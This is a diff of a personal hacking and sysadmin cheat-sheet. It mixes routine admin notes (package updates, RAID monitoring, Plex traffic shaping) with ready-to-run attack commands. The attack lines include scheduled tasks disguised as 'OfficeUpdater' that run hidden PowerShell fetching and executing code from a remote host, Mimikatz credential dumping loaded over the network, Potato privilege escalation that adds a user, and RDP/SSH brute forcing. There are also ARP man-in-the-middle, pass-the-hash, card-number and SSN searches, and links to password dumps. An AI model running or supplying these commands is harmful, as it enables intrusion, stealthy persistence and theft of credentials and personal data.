+
+
+# MongoDB notes
+mongodump --host 127.0.0.1
+mongo HOSTNAME   --eval "printjson(db.getCollectionNames())"
+
+show dbs
+use DB
+db.getName()
+db.getCollectionNames()
+
+
+
+service mongod start
+
+# more masscan
+masscan -p80,8000-8100 10.0.0.0/8
+masscan -p0-65535 --rate 150000 -oL output.txt
+
+masscan -p0-65535 23.239.151.0/24 --rate 150000 -oL output.txt
+
+# playback conf
+/masscan -p0-65535 23.239.151.0/24 --rate 150000 -oL output.txt --echo > scan.conf
+/masscan -c scan.conf
+
+masscan --ports 80,443,22,445,135,139,5900,5800,5901,5801,8080 --rate 150000 -oL 172_masscan_common.txt  172.16.0.0/12
+
+
+masscan   -p21,22,23,25,53,80,88,110,111,113,135,139,143,220,264,389,443,445,449,524,585,636,993,995,1433,1521,1723,3306,3389,5900,8080    --rate=14114 --open --excludefile BLACKLIST --ping  172.16.0.0/12 -oX  172.xml
+
+
+
+# idea for new and improved smart nmap ? just worry about the last oct guessing .. so .1 .2 .254 .10 .100 etc..
+nmap --max-retries 1 --min-parallelism 100 172.16-31.0-255.1,2,3,4,5,10,20,30,100,254 -sV -oA 172_sV_GUESS --top-ports 20 -T5
+nmap --max-retries 1 --min-parallelism 100 10.0-255.0-255.1,2,3,10,20,30,100,254      -sV -oA  10_sV_GUESS --top-ports 20 -T5
+
+
+# potato PO TAT O ! !!!!!!!!!!!!!!!!!!!!!
+Potato.exe -ip 25.0.0.151 -cmd "c:\\windows\\system32\\cmd.exe /k net user add SUCKITGARY 123QWE#" 
+
+
+# you know ...
+
+#(X86) - On User Login
+schtasks /create /tn OfficeUpdaterA /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onlogon /ru System
+ 
+#(X86) - On System Start
+schtasks /create /tn OfficeUpdaterB /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onstart /ru System
+ 
+#(X86) - On User Idle (30mins)
+schtasks /create /tn OfficeUpdaterC /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onidle /i 30
+ 
+#(X64) - On User Login
+schtasks /create /tn OfficeUpdaterA /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onlogon /ru System
+ 
+#(X64) - On System Start
+schtasks /create /tn OfficeUpdaterB /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onstart /ru System
+ 
+#(X64) - On User Idle (30mins)
+schtasks /create /tn OfficeUpdaterC /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onidle /i 30
+
+# armitage script for fvwm-crystal / PTF 
+cat /usr/local/sbin/armitage 
+
+cd /opt/armitage
+
+cat <<EOF> /tmp/armitage_rc
+
+export PATH="$PATH:/pentest/exploitation/metasploit"
+export MSF_DATABASE_CONFIG="/opt/database.yml"
+FvwmCommand Style "*" Lenience
+cd /opt/armitage/
+./armitage
+
+EOF
+
+chmod -R 755  /tmp/armitage_rc
+screen -fa -d -m /tmp/armitage_rc
+
+
+
+#horrid way to json to csv to find sploits or something .. I gave up
+for i in `ls` ;do echo $i;cat $i; done | sed 's/^CVE/BREAKCVE/g' |sed 's/^}CVE/BREAKCVE/g'|egrep -v '(\"summary\")'  |sed 's/,/ /g'| egrep -ia '(BREAKCVE|url|exploit|summery|title)' | tr -d '\n' |  awk '{gsub("BREAKCVE","\nCVE"); print}'| sed 's/{/,/g' | sed 's/  //g' >out.csv
+
+
+vfeed example
+wget 'https://vfeed.dpdcart.com/fulfillment/download?fulfillment_id=13684802&fulfillment_file_id=9878428&filename=vfeed.db.tgz&purchase_id=9771223&salt=8f38a08adc295eea2a21d9e64342304f9ab11992'
+git pull -f
+./vfeedcli.py -m get_cve CVE-2015-0240
+
+./vfeedcli.py -m json_dump CVE-2015-1761 | egrep -ia '(url|exploit|summary|title)'
+
+
+here is a link to some of my main wordlist:
+
+https://www.amazon.com/clouddrive/share/uBt6kSsUNLUmVl7aqLB5kDC7iJ8zx4eaxVgkar8Mhqw?ref_=cd_ph_share_link_copy
+
+_18_in_1: is about 40gigs uncompressed
+found_2015.txt and 2016: are more recent dumps http://hashes.org/crackers.php 
+
+
+reversing and firmware (IOT)
+
+https://security.googleblog.com/2016/03/bindiff-now-available-for-free.html
+
+firmware stuff
+http://wiki.securityweekly.com/wiki/index.php/Reverse_Engineering_Firmware_Primer
+https://github.com/mirror/firmware-mod-kit
+
+
+# bettercap MITM HSTS
+bettercap --proxy -P POST
+
+# ettercap duh ..
+
+ettercap -w try1.pcap -T -M ARP /TARGET// /// -P autoadd 
+
+
+# tcpdump with some flags 
+
+tcpdump -i <interface> -s 65535 -w <some-file>tcpdump -i <interface> -s 65535 -w <some-file>
+
+
+12:35 < SyncYourDogmas> tcpdump -qns 0 -A -r -
+
+# dump URL with ip src and dst 
+tshark -nr dump.pcap    -E separator=, -R "http.request.uri " -T fields  -e frame.number -e frame.time -e ip.src -e ip.dst -e text
+
+# dont use ....stupid hex outputwith \r in it  dump some decoded info and the packet data in hex ascii 
+tshark -PVx -r dump.pcap -T text
+
+# Ubuntu auto updates
+apt-get update
+apt-get install unattended-upgrades -y
+dpkg-reconfigure --priority=low unattended-upgrades
+# set Reboot to true
+vi /etc/apt/apt.conf.d/50unattended-upgrades
+unattended-upgrades
+
+
+# ubuntu aunattended rel upgrades
+do-release-upgrade -f DistUpgradeViewNonInteractive
+
+
+# CentOS ... LVM/XFS resize
+lvextend -l 100%VG /dev/mapper/centos-root
+This one extends the filesystem while booted
+xfs_growfs /
+
+# rdp and ssh brute
+ncrack -p rdp -u administrator --pass 'password' -iL in2
+ncrack -p ssh -u root --pass 'root' -iL in
+
+#iftop config 
+cat << EOF > ~/iftop.conf
+max-bandwidth: 10M
+port-display: on # Controls display of port numbers.
+port-resolution: yes # Controls conversion of port numbers to service names
+screen-filter: not port 22 # filter out yourself
+EOF
+
+iftop  -c ~/iftop.conf
+
+
+
+#plex traffic shape
+
+modprobe sch_htb
+/sbin/tc qdisc del dev eth0 root
+/sbin/iptables -D OUTPUT -t mangle -p tcp --sport 32400 '!' --dst 25.0.0.0/8 -j MARK --set-mark 10
+/sbin/tc qdisc add dev eth0 root handle 1: htb default 20 r2q 50
+/sbin/tc class add dev eth0 parent 1: classid 1:1 htb rate 4mbit ceil 4mbit
+/sbin/tc class add dev eth0 parent 1:1 classid 1:10 htb rate 2mbit ceil 4mbit
+/sbin/tc qdisc add dev eth0 parent 1:10 handle 100: sfq perturb 10
+/sbin/iptables -A OUTPUT -t mangle -p tcp --sport 32400 '!' --dst 25.0.0.0/8 -j MARK --set-mark 10
+/sbin/tc filter add dev eth0 parent 1: prio 3 protocol all handle 10 fw flowid 1:10
+
+## show TC rules
+/sbin/tc -s -d class show dev eth0
+## Show iptables mangle rules
+/sbin/iptables -t mangle -n -v -L
+## Show actual bandwidth being used on 32400
+watch -n 1 /sbin/tc -s -d class show dev eth0
+
+
+##KODI XBMC OSD
+export var1=`df -h | egrep "(\/$|sdb1|sdc1)" | awk '{print $4"|",$6"|"}'|tr -d '\n'`
+wget --header="Content-Type: application/json" --post-data="{\"jsonrpc\":\"2.0\",\"method\":\"GUI.ShowNotification\",\"params\":{\"title\":\"Disk Space\",\"message\":\"$var1\", \"image\":\"<image path or URL to image here>\"},\"id\":1}" http://localhost:9999/jsonrpc
 
 #Wireless Backdoor Creation: Credit http://pwnwiki.io/
 netsh wlan set hostednetwork mode=[allow\|disallow]
@@ -45,11 +1309,13 @@ wget --header="Content-Type: application/json" --post-data="{\"jsonrpc\":\"2.0\"
 
 apt-get purge -y hostapd && sudo apt-get purge -y network-manager && sudo apt-get install network-manager
 
-# some nse scripts to run on host
-nmap -oA nse --script discovery,safe,vuln,version 172.16.22.11
+# nmap PTH
+nmap -p U:137,T:139 -script-args -smbuser=mike,smbhash=8846f7eaee8fb117ad06bdd830b7586c. -script=smb-enum-groups -script=smb-enum-users 192.168.52.151
+
 
 # danger NMAP!
-nmap -oA nse --script auth,brute,discovery,exploit,external,fuzzer,intrusive,malware,safe,version,vuln --script-args=unsafe=1 --script-args=unsafe 
+
+
 
 
 #  Powershell Empire lulz
@@ -84,16 +1350,38 @@ mkdir /media/SSD
 mount -t cifs "//IP\Open Share" /media/SSD -o username=guest,noexec
 
 
-:# monitor HP RAID
-apt-get install hp-health
-apt-get install hpacucli
-apt-get install hponcfg
+# monitor HP RAID
+# https://downloads.linux.hpe.com/SDR/repo/mcp/Debian/dists/trusty/10.40/non-free/binary-amd64/Packages
+
+apt-get clean
+apt-get update
+
+apt-get --purge remove hp-health  -y 
+apt-get --purge remove hponcfg  -y 
+apt-get --purge remove hpacucli  -y 
+apt-get --purge remove ssacli -y  
 
 
-hpacucli ctrl all show status
-hplog -t
-hpacucli ctrl all show config       
 
+
+
+wget -o add_repo.sh 'https://downloads.linux.hpe.com/SDR/add_repo.sh'
+bash add_repo.sh   -v mcp
+apt-get update
+
+apt-get install hp-health -y
+apt-get install ssacli -y
+apt-get install hponcfg -y
+
+
+#hplog -t
+ssacli ctrl all show status
+ssacli ctrl all show config
+
+
+ssacli controller all show config detail | grep -A 7 -B 3 Fail | egrep '(Failed|Last|Serial Number|Port)'
+
+ 
 
 
 
@@ -161,8 +1449,10 @@ REGEXP FOR CLASS C NETWORKS :
 (192)\.(168)(\.([2][0-5][0-5]|[1][0-9][0-9]|[1-9][0-9]|[0-9])){2}
 
 # CDP SSDP 
-nmap --script broadcast-listener --script-args=broadcast-listener.timeout=60
+nmap --script broadcast-listener --script-args=broadcast-listener.timeout=60 -oA broadcast_listener
 
+# better ?
+nmap --script discovery --script-args=broadcast-listener.timeout=60 -oA broadcast_listener_discovery
 
 #Temporary Switch gateway script:
 
@@ -279,7 +1569,7 @@ unicornscan -L 10  -R 2 -r 1000 -p 21,25,53,80,110,111,135,139,143,443,445,993,9
 
 #mimikatz bypass AV dump creds
 powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds"
-powershell "IEX (New-Object Net.WebClient).DownloadString('http://rmccurdy.com/scripts/downloaded/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
+powershell "IEX (New-Object Net.WebClient).DownloadString('http://185.12.45.93/scripts/downloaded/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
 powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds -ComputerName @('computer1', 'computer2')"
 
 # chown chmod for windows run as system or administrator
@@ -412,20 +1702,43 @@ End Function
 =CONCATENATE(A9,(IF(ISBLANK(B9),""," ("&B9&")")))
 
 # Mount all NFS shares on a remote host with input file nfs as hosts to mount
-for i in `cat nfs` 
-do
+--------------------------------------
+
+# cleanup
+for i in `ls /nfs*` ;do umount "/nfs/$i" ;done
+
 mkdir /nfs
+# Mount all NFS shares on a remote host with input file nfs as hosts to mount
+for i in `cat nfs`
+do
 
 
-for j in `showmount -e $i |awk '{print $1}'` 
-do 
+for j in `showmount -e $i |awk '{print $1}'`
+do
 var1=$RANDOM
 mkdir /nfs/$i_$var1
 mount -t nfs $i:$j /nfs/$i_$var1
 done
 
+done
+
+echo creating nfs_report.txt
+
+df | grep : | sort -u  > nfs_report.txt
+for i in `df | grep : | sort -u | awk '{print $6}'`
+do
+
+find  "$i" -maxdepth 2 -type f -exec file '{}' \; >> nfs_report.txt
 
 done
+
+
+==-========================== 
+
+
+
+
+
 
 # example PII search CC and SSN with dashes and max results 10 per file
 find .  -maxdepth 6  -size -100000k -type f  -exec egrep --max-count 10 -A 2 -B 2 -Hia "\b4[0-9]{12}(?:[0-9]{3})?\b|\b5[1-5][0-9]{14}\b|\b6011[0-9]{14}\b|\b3(?:0[0-5]\b|\b[68][0-9])[0-9]{11}\b|\b3[47][0-9]{13}\b|\b[0-9]{3}-[0-9]{2}-[0-9]{4}\b" '{}' \;
@@ -453,7 +1766,7 @@ apt-get install xinit -y
 echo 'exec fvwm-crystal' > ~/.xinitrc
 
 # install stuff 
-apt-get install build-essential  libssl-dev    partimage gparted lynx links curl nmap iotop screen medusa  wireshark macchanger -y 
+apt-get install build-essential  libssl-dev    partimage gparted lynx links curl nmap iotop screen medusa  wireshark macchanger htop net-tools -y 
 
 
 #force umount
@@ -795,6 +2108,15 @@ DELETE FROM loots;
 DELETE FROM sessions;
 DELETE FROM clients;
 \q
+
+
+
+# before nmap  xml import for autopwn
+find . -iname "*.xml" -exec sed -r "s/(portid=\")(80)(\"><state state=\"open\")/portid=\"\2\"><state state=\"closed\"/g"  -i.bak '{}' \;
+find . -iname "*.xml" -exec sed -r "s/(portid=\")(443)(\"><state state=\"open\")/portid=\"\2\"><state state=\"closed\"/g"  -i.bak '{}' \;
+find . -iname "*.xml" -exec sed -r "s/(portid=\")(8080)(\"><state state=\"open\")/portid=\"\2\"><state state=\"closed\"/g"  -i.bak '{}' \;
+find . -iname "*.xml" -exec sed -r "s/(portid=\")(8443)(\"><state state=\"open\")/portid=\"\2\"><state state=\"closed\"/g"  -i.bak '{}' \;
+
 
 # gogo
 db_nmap -p 445 10.0.2.2
